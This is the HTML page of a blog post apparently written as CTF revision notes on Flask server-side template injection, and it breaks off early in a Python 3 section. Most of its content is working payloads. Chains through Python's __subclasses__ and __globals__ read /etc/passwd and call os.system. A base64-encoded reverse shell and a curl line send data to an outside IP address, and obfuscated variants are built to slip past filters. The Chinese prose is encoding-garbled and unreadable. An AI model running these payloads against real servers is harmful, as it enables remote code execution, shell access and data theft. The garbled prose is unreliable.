<!DOCTYPE html>
<html lang="en">
  <head>
    
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="description" content="flaskæ¨¡ç‰ˆæ³¨å…¥"/>




  <meta name="keywords" content="ctf," />





  <link rel="alternate" href="/default" title="glotozz'blog">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />



<link rel="canonical" href="https://glotozz.github.io/2020/02/24/flaskæ¨¡ç‰ˆæ³¨å…¥/"/>


<meta name="description" content="æ¯”èµ›æ—¶é‡åˆ°flask sstiï¼Œé‚å¤ä¹ ä¸€ä¸‹">
<meta property="og:type" content="article">
<meta property="og:title" content="flaskæ¨¡ç‰ˆæ³¨å…¥">
<meta property="og:url" content="https://glotozz.github.io/2020/02/24/flask%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/index.html">
<meta property="og:site_name" content="glotozz&#39;blog">
<meta property="og:description" content="æ¯”èµ›æ—¶é‡åˆ°flask sstiï¼Œé‚å¤ä¹ ä¸€ä¸‹">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2020/02/27/9Qlo7WmfwAHDhBn.jpg">
<meta property="og:image" content="https://i.loli.net/2020/02/24/NB1qgLYkTtIsiWo.png">
<meta property="og:image" content="https://i.loli.net/2020/02/24/e4nIbyOrsGTRVvE.png">
<meta property="og:image" content="https://i.loli.net/2020/02/24/opIWP5TdSs7uKCE.png">
<meta property="og:image" content="https://i.loli.net/2020/02/24/Mbd1aypGULlEmjK.png">
<meta property="og:image" content="https://i.loli.net/2020/02/24/ynWGKe9NoX7vJrD.png">
<meta property="og:image" content="https://i.loli.net/2020/02/24/4QkOHi6lTNpsA7X.png">
<meta property="og:image" content="https://i.loli.net/2020/02/24/v4n2wamzGpJxyct.png">
<meta property="og:image" content="https://i.loli.net/2020/02/24/jw7sStYhX534kTa.png">
<meta property="og:image" content="https://i.loli.net/2020/02/24/VhvMFANZCy7m9fz.png">
<meta property="og:image" content="https://i.loli.net/2020/02/24/WAyTklhRX4iYeOa.png">
<meta property="og:image" content="https://i.loli.net/2020/03/02/zcjwfxstTpdqekr.png">
<meta property="og:image" content="https://i.loli.net/2020/03/06/FmYOAgdIZWf6iJ5.png">
<meta property="article:published_time" content="2020-02-24T01:11:15.000Z">
<meta property="article:modified_time" content="2020-03-29T13:25:04.004Z">
<meta property="article:author" content="glotozz">
<meta property="article:tag" content="ctf">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2020/02/27/9Qlo7WmfwAHDhBn.jpg">


<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>





<script type="text/javascript">
  var themeConfig = {
    fancybox: {
      enable: false
    },
  };
</script>




  


<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="http://music.163.com/song/media/outer/url?id=1321392802.mp3"></iframe>--!>
<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/outchain/player?type=2&id=574288806&auto=0&height=66"></iframe>--!>
    <title> flaskæ¨¡ç‰ˆæ³¨å…¥ - glotozz'blog </title>
  <meta name="generator" content="Hexo 4.2.0"></head>

  <body>
    <div id="page">
      <header id="masthead"><div class="site-header-inner">
    <h1 class="site-title">
        <a href="/." class="logo">glotozz'blog</a>
    </h1>

    <nav id="nav-top">
        
            <ul id="menu-top" class="nav-top-items">
                
                    <li class="menu-item">
                        <a href="/archives">
                            
                            
                                Archives
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/about">
                            
                            
                                About
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/read">
                            
                            
                                Read
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/stars">
                            
                            
                                Stars
                            
                        </a>
                    </li>
                
            </ul>
        
  </nav>
</div>

      </header>
      <div id="content">
        
    <div id="primary">
        
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          flaskæ¨¡ç‰ˆæ³¨å…¥
        
      </h1>

      <time class="post-time">
          Feb 24 2020
      </time>
    </header>



    
            <div class="post-content">
            <p>æ¯”èµ›æ—¶é‡åˆ°flask sstiï¼Œé‚å¤ä¹ ä¸€ä¸‹</p>
<meta name="referrer" content="no-referrer">
<a id="more"></a>

<hr>
<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>ç®€é™‹çš„ç›®å½•</strong></p>
<!-- toc -->

<ul>
<li><a href="#ç®€è¿°">ç®€è¿°</a></li>
<li><a href="#python2">Python2</a></li>
<li><a href="#python3">Python3</a></li>
<li><a href="#some-tricksæµ‹è¯•ç¯å¢ƒä¸ºpy2">Some Tricksï¼ˆæµ‹è¯•ç¯å¢ƒä¸ºPy2ï¼‰</a></li>
<li><a href="#æ€»ç»“">æ€»ç»“</a></li>
<li><a href="#å‚è€ƒé“¾æ¥">å‚è€ƒé“¾æ¥</a></li>
</ul>
<!-- tocstop -->

<hr>
<img src="https://i.loli.net/2020/02/27/9Qlo7WmfwAHDhBn.jpg" alt="v2-f6bcbda977f86eb7bd9532bd94331f59_720w.jpg" style="zoom:67%;">

<h4><span id="ç®€è¿°">ç®€è¿°</span></h4><blockquote>
<p><a href="https://www.freebuf.com/column/187845.html" target="_blank" rel="noopener">æ¼æ´åŸç†å‚è€ƒ</a></p>
</blockquote>
<p>æ¼æ´åŸç†ç”¨ä¸€å¥è¯æ¦‚æ‹¬ï¼šä¸æ­£ç¡®çš„ä½¿ç”¨flaskä¸­çš„<code>render_template_string()</code>å¯¼è‡´çš„<code>SSTI</code>ï¼Œå¹¶ä¸”<strong>æ¨¡æ¿å†…å®¹ç›´æ¥å—ç”¨æˆ·æ§åˆ¶</strong></p>
<p>è¿™ç¯‡æ–‡ç« ä¸»è¦æ˜¯å€Ÿflask SSTIå¤ä¹ ä¸‹pythonæ²™ç›’é€ƒé€¸ï¼Œæ•´ç†ä¸‹payloadï¼Œç†è®ºä¸Šä¸åŒæœºå™¨ã€ä¸åŒpythonç‰ˆæœ¬çš„payloadæ˜¯ä¸å°½ç›¸åŒçš„ã€‚</p>
<p>æµ‹è¯•ä»£ç </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    code = request.args.get(<span class="string">'id'</span>)</span><br><span class="line">    html = <span class="string">'''</span></span><br><span class="line"><span class="string">        &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">    '''</span>%(code)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html)</span><br></pre></td></tr></table></figure>

<p>ä¸¤ç§å¯åŠ¨æ–¹å¼ï¼š</p>
<p><code>flask run --host=0.0.0.0</code>ï¼Œéœ€è¦å¯åŠ¨çš„æ—¶å€™è®¾ç½®hostï¼Œ<code>app.run()</code>ä¸­æ›´æ”¹æ— æ•ˆ</p>
<p><code>python app.py</code>ï¼Œåœ¨<code>app.run()</code>ä¸­è®¾ç½®hostï¼Œåˆ‡æ¢pythonç‰ˆæœ¬æ¯”è¾ƒæ–¹ä¾¿</p>
<p>ç¡®è®¤æ­£å¸¸è®¿é—®</p>
<img src="https://i.loli.net/2020/02/24/NB1qgLYkTtIsiWo.png" alt="Snipaste_2020-02-24_10-02-29.png" style="zoom:67%;">

<hr>
<p><strong>å…¨å±€å˜é‡</strong></p>
<p><code></code>,æ¯”è¾ƒå¸¸è§çš„è¯»å–æ˜¯SECRET_KEY</p>
<p><strong>æ–‡ä»¶è¯»å–/å‘½ä»¤æ‰§è¡Œ</strong></p>
<p>æ— è®ºæ˜¯å®ç°æ–‡ä»¶è¯»å–è¿˜æ˜¯å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦åˆ©ç”¨å¯¹è±¡çš„ç»§æ‰¿ï¼Œå…ˆæ‰¾åˆ°çˆ¶ç±»<code>&lt;type &#39;object&#39;&gt;</code>ï¼Œå†å¯»æ‰¾å­ç±»ï¼Œæœ€åæ‰¾åˆ°æˆ‘ä»¬éœ€è¦ç”¨åˆ°çš„ç›¸åº”æ¨¡å—</p>
<p><strong>å‡ ä¸ªè¦ç”¨åˆ°çš„é­”æœ¯æ–¹æ³•</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__class__  è¿”å›ç±»å‹æ‰€å±çš„å¯¹è±¡</span><br><span class="line">__mro__    è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„ï¼Œæ–¹æ³•åœ¨è§£ææ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æã€‚</span><br><span class="line">__base__   è¿”å›è¯¥å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»</span><br><span class="line">&#x2F;&#x2F; __base__å’Œ__mro__éƒ½æ˜¯ç”¨æ¥å¯»æ‰¾åŸºç±»çš„</span><br><span class="line"></span><br><span class="line">__subclasses__   æ¯ä¸ªæ–°ç±»éƒ½ä¿ç•™äº†å­ç±»çš„å¼•ç”¨ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›ä¸€ä¸ªç±»ä¸­ä»ç„¶å¯ç”¨çš„çš„å¼•ç”¨çš„åˆ—è¡¨</span><br><span class="line">__init__  ç±»çš„åˆå§‹åŒ–æ–¹æ³•</span><br><span class="line">__globals__  å¯¹åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨</span><br></pre></td></tr></table></figure>



<h4><span id="python2">Python2</span></h4><p>å…ˆæµ‹è¯•<strong>Python 2.7.17</strong></p>
<p>éœ€è¦å…ˆé€‰å–ä¸€ä¸ªç±»ï¼Œå‡ ç§å¸¸è§çš„ç±»<code>&#39;&#39;</code>ã€<code>request</code>ã€<code>[]</code>ã€<code>()</code></p>
<p>1ã€è·å–ç±»å¯¹è±¡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__</span><br><span class="line">&lt;type &#39;str&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; import request</span><br><span class="line">&gt;&gt;&gt; request.__class__</span><br><span class="line">&lt;type &#39;module&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__</span><br><span class="line">&lt;type &#39;list&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; ().__class__</span><br><span class="line">&lt;type &#39;tuple&#39;&gt;</span><br></pre></td></tr></table></figure>

<p>2ã€å¯»æ‰¾åŸºç±»<code>object</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__</span><br><span class="line">(&lt;type &#39;str&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;object&#39;&gt;)</span><br><span class="line">&gt;&gt;&gt; request.__class__.__mro__</span><br><span class="line">(&lt;type &#39;module&#39;&gt;, &lt;type &#39;object&#39;&gt;)</span><br><span class="line">&gt;&gt;&gt; [].__class__.__mro__</span><br><span class="line">(&lt;type &#39;list&#39;&gt;, &lt;type &#39;object&#39;&gt;)</span><br><span class="line">&gt;&gt;&gt; ().__class__.__mro__</span><br><span class="line">(&lt;type &#39;tuple&#39;&gt;, &lt;type &#39;object&#39;&gt;)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__</span><br><span class="line">&lt;type &#39;object&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; ().__class__.__base__</span><br><span class="line">&lt;type &#39;object&#39;&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>objectåœ¨æœ€åº•å±‚æ•…åœ¨åˆ—è¡¨ä¸­çš„æœ€åï¼Œé€šè¿‡<code>__mro__[-1]</code>å¯ä»¥è·å–åˆ°</p>
</blockquote>
<p>3ã€å¯»æ‰¾å¯ç”¨çš„å¼•ç”¨</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[2].__subclasses__()</span><br><span class="line">[&lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type &#39;weakcallableproxy&#39;&gt;, &lt;type &#39;weakproxy&#39;&gt;, &lt;type &#39;int&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;bytearray&#39;&gt;, &lt;type &#39;list&#39;&gt;, &lt;type &#39;NoneType&#39;&gt;, &lt;type &#39;NotImplementedType&#39;&gt;, &lt;type &#39;traceback&#39;&gt;, &lt;type &#39;super&#39;&gt;, &lt;type &#39;xrange&#39;&gt;, &lt;type &#39;dict&#39;&gt;, &lt;type &#39;set&#39;&gt;, &lt;type &#39;slice&#39;&gt;, &lt;type &#39;staticmethod&#39;&gt;, &lt;type &#39;complex&#39;&gt;, &lt;type &#39;float&#39;&gt;, &lt;type &#39;buffer&#39;&gt;, &lt;type &#39;long&#39;&gt;, &lt;type &#39;frozenset&#39;&gt;, &lt;type &#39;property&#39;&gt;, &lt;type &#39;memoryview&#39;&gt;, &lt;type &#39;tuple&#39;&gt;, &lt;type &#39;enumerate&#39;&gt;, &lt;type &#39;reversed&#39;&gt;, &lt;type &#39;code&#39;&gt;, &lt;type &#39;frame&#39;&gt;, &lt;type &#39;builtin_function_or_method&#39;&gt;, &lt;type &#39;instancemethod&#39;&gt;, &lt;type &#39;function&#39;&gt;, &lt;type &#39;classobj&#39;&gt;, &lt;type &#39;dictproxy&#39;&gt;, &lt;type &#39;generator&#39;&gt;, &lt;type &#39;getset_descriptor&#39;&gt;, &lt;type &#39;wrapper_descriptor&#39;&gt;, &lt;type &#39;instance&#39;&gt;, &lt;type &#39;ellipsis&#39;&gt;, &lt;type &#39;member_descriptor&#39;&gt;, &lt;type &#39;file&#39;&gt;, &lt;type &#39;PyCapsule&#39;&gt;, &lt;type &#39;cell&#39;&gt;, &lt;type &#39;callable-iterator&#39;&gt;, &lt;type &#39;iterator&#39;&gt;, &lt;type &#39;sys.long_info&#39;&gt;, &lt;type &#39;sys.float_info&#39;&gt;, &lt;type &#39;EncodingMap&#39;&gt;, &lt;type &#39;fieldnameiterator&#39;&gt;, &lt;type &#39;formatteriterator&#39;&gt;, &lt;type &#39;sys.version_info&#39;&gt;, &lt;type &#39;sys.flags&#39;&gt;, &lt;type &#39;exceptions.BaseException&#39;&gt;, &lt;type &#39;module&#39;&gt;, &lt;type &#39;imp.NullImporter&#39;&gt;, &lt;type &#39;zipimport.zipimporter&#39;&gt;, &lt;type &#39;posix.stat_result&#39;&gt;, &lt;type &#39;posix.statvfs_result&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &lt;class &#39;_abcoll.Hashable&#39;&gt;, &lt;type &#39;classmethod&#39;&gt;, &lt;class &#39;_abcoll.Iterable&#39;&gt;, &lt;class &#39;_abcoll.Sized&#39;&gt;, &lt;class &#39;_abcoll.Container&#39;&gt;, &lt;class &#39;_abcoll.Callable&#39;&gt;, &lt;type &#39;dict_keys&#39;&gt;, &lt;type &#39;dict_items&#39;&gt;, &lt;type &#39;dict_values&#39;&gt;, &lt;class &#39;site._Printer&#39;&gt;, &lt;class &#39;site._Helper&#39;&gt;, &lt;type &#39;_sre.SRE_Pattern&#39;&gt;, &lt;type &#39;_sre.SRE_Match&#39;&gt;, &lt;type &#39;_sre.SRE_Scanner&#39;&gt;, &lt;class &#39;site.Quitter&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &lt;class &#39;urlparse.ResultMixin&#39;&gt;, &lt;type &#39;collections.deque&#39;&gt;, &lt;type &#39;deque_iterator&#39;&gt;, &lt;type &#39;deque_reverse_iterator&#39;&gt;, &lt;type &#39;operator.itemgetter&#39;&gt;, &lt;type &#39;operator.attrgetter&#39;&gt;, &lt;type &#39;operator.methodcaller&#39;&gt;, &lt;type &#39;itertools.combinations&#39;&gt;, &lt;type &#39;itertools.combinations_with_replacement&#39;&gt;, &lt;type &#39;itertools.cycle&#39;&gt;, &lt;type &#39;itertools.dropwhile&#39;&gt;, &lt;type &#39;itertools.takewhile&#39;&gt;, &lt;type &#39;itertools.islice&#39;&gt;, &lt;type &#39;itertools.starmap&#39;&gt;, &lt;type &#39;itertools.imap&#39;&gt;, &lt;type &#39;itertools.chain&#39;&gt;, &lt;type &#39;itertools.compress&#39;&gt;, &lt;type &#39;itertools.ifilter&#39;&gt;, &lt;type &#39;itertools.ifilterfalse&#39;&gt;, &lt;type &#39;itertools.count&#39;&gt;, &lt;type &#39;itertools.izip&#39;&gt;, &lt;type &#39;itertools.izip_longest&#39;&gt;, &lt;type &#39;itertools.permutations&#39;&gt;, &lt;type &#39;itertools.product&#39;&gt;, &lt;type &#39;itertools.repeat&#39;&gt;, &lt;type &#39;itertools.groupby&#39;&gt;, &lt;type &#39;itertools.tee_dataobject&#39;&gt;, &lt;type &#39;itertools.tee&#39;&gt;, &lt;type &#39;itertools._grouper&#39;&gt;, &lt;type &#39;_thread._localdummy&#39;&gt;, &lt;type &#39;thread._local&#39;&gt;, &lt;type &#39;thread.lock&#39;&gt;, &lt;class &#39;string.Template&#39;&gt;, &lt;class &#39;string.Formatter&#39;&gt;, &lt;type &#39;_io._IOBase&#39;&gt;, &lt;type &#39;_io.IncrementalNewlineDecoder&#39;&gt;, &lt;type &#39;_hashlib.HASH&#39;&gt;, &lt;type &#39;_random.Random&#39;&gt;, &lt;type &#39;cStringIO.StringO&#39;&gt;, &lt;type &#39;cStringIO.StringI&#39;&gt;, &lt;type &#39;time.struct_time&#39;&gt;]</span><br></pre></td></tr></table></figure>

<p>4ã€æ–‡ä»¶è¯»å–</p>
<p><strong>Payload 1</strong></p>
<p>å‘ç°40çš„åœ°æ–¹å­˜åœ¨ <code>&lt;type &#39;file&#39;&gt;</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br><span class="line">request.__class__.__mro__[1].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2020/02/24/e4nIbyOrsGTRVvE.png" alt="Snipaste_2020-02-24_10-16-50.png" style="zoom:67%;">

<p>æŸ¥ä¸‹æ ‡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[().__class__.__bases__[0].__subclasses__()[i].__name__ for i in range(len(().__class__.__bases__[0].__subclasses__()))].index(&#39;file&#39;)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__():</span><br><span class="line">	<span class="keyword">print</span> num</span><br><span class="line">	<span class="keyword">print</span> item</span><br><span class="line">        num+=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><strong>Payload 2</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">59</span><br><span class="line">&lt;class &#39;warnings.catch_warnings&#39;&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br></pre></td></tr></table></figure>

<p>5ã€å‘½ä»¤æ‰§è¡Œ</p>
<p>å¯»æ‰¾åŒ…å«<code>os</code>æ¨¡å—çš„è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> <span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">         <span class="keyword">if</span> <span class="string">'os'</span> <span class="keyword">in</span> item.__init__.__globals__:</span><br><span class="line">             <span class="keyword">print</span> num,item</span><br><span class="line">         num+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'-'</span></span><br><span class="line">        num+=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">71 &lt;class &#39;site._Printer&#39;&gt;</span><br><span class="line">-</span><br><span class="line">-</span><br><span class="line">-</span><br><span class="line">-</span><br><span class="line">76 &lt;class &#39;site.Quitter&#39;&gt;</span><br></pre></td></tr></table></figure>

<p>å‰é¢å·²ç»æ‰¾åˆ°äº†åŒ…å«<code>os</code>æ¨¡å—çš„ç±»ï¼Œå…ˆåˆå§‹åŒ–ï¼Œå†å¼•ç”¨å³å¯</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2020/02/24/opIWP5TdSs7uKCE.png" alt="Snipaste_2020-02-24_10-39-01.png" style="zoom:67%;">

<p>åªä¸è¿‡å‘½ä»¤æ‰§è¡Œæ²¡æœ‰å›æ˜¾ï¼Œéœ€è¦åå¼¹shellæˆ–è€…åˆ©ç”¨<code>curl</code>å¸¦å‡º</p>
<p>åå¼¹shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTcuNzguMS4yMDQvMTIzNCAwPiYxCg&#x3D;&#x3D;|base64 -d|bash&#39;)</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2020/02/24/Mbd1aypGULlEmjK.png" alt="Snipaste_2020-02-24_10-50-06.png" style="zoom:67%;">

<p>curlå¸¦å‡º</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;data&#x3D;$(cat &#x2F;fffffflag | base64);curl http:&#x2F;&#x2F;117.78.1.204&#x2F;?data&#x3D;$data;&#39;)</span><br></pre></td></tr></table></figure>

<p><code>catch_warnings</code>ä¹Ÿå¯ä»¥è¿›ä¸€æ­¥æ„é€ æ¥æ‰§è¡Œå‘½ä»¤ </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">59</span><br><span class="line">&lt;class &#39;warnings.catch_warnings&#39;&gt;</span><br></pre></td></tr></table></figure>

<p>å…ˆä»‹ç»ä¸¤ä¸ªå±æ€§ï¼Œå·²çŸ¥å‡½æ•°åå¯è·å–å‡½æ•°ä¿¡æ¯</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def fun(x&#x3D;1):</span><br><span class="line">    # nothing here</span><br><span class="line">    a&#x3D;x*2</span><br><span class="line">    flag&#x3D;&#39;neko&#39;</span><br><span class="line">    return a</span><br><span class="line">print fun.func_code.co_consts</span><br><span class="line">print fun.func_globals</span><br><span class="line"></span><br><span class="line">&#x3D;&gt;</span><br><span class="line">(None, 2, &#39;neko&#39;)</span><br><span class="line">&#123;&#39;__builtins__&#39;: &lt;module &#39;__builtin__&#39; (built-in)&gt;, &#39;__file__&#39;: &#39;b.py&#39;, &#39;__package__&#39;: None, &#39;fun&#39;: &lt;function fun at 0x7f1b9317e750&gt;, &#39;__name__&#39;: &#39;__main__&#39;, &#39;__doc__&#39;: None&#125;</span><br></pre></td></tr></table></figure>

<p>å¯æ„é€ </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&quot;linecache&quot;].__dict__[&#39;os&#39;].__dict__[&#39;system&#39;](&#39;ls&#39;)</span><br></pre></td></tr></table></figure>

<p>è¿˜æœ‰å‡ ç§å˜å½¢</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__import__(&quot;o&quot;+&quot;s&quot;).__getattribute__(&#39;sys&#39;+&#39;tem&#39;)(&quot;l&quot;+&quot;s&quot;)</span><br><span class="line"></span><br><span class="line">__builtins__.__dict__[&#39;X19pbXBvcnRfXw&#x3D;&#x3D;&#39;.decode(&#39;base64&#39;)](&#39;b3M&#x3D;&#39;.decode(&#39;base64&#39;)).__getattribute__(&#39;sys&#39;+&#39;tem&#39;)(&#39;l&#39;+&#39;s&#39;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;os&#39;].system(&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__.values()[12].system(&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[59]()._module.linecache.os.system(&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">&#123;(lambda getthem&#x3D;([x for x in ().__class__.__base__.__subclasses__() if x.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;][0]()._module.__builtins__):getthem[&#39;__import__&#39;](&#39;os&#39;).system(&#39;ls&#39;))()&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4><span id="python3">Python3</span></h4><p><strong>Python 3.7.5</strong></p>
<p>1ã€è·å–ç±»å¯¹è±¡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__</span><br><span class="line">&lt;class &#39;str&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; ().__class__</span><br><span class="line">&lt;class &#39;tuple&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__</span><br><span class="line">&lt;class &#39;list&#39;&gt;</span><br></pre></td></tr></table></figure>

<p>2ã€å¯»æ‰¾åŸºç±»<code>object</code></p>
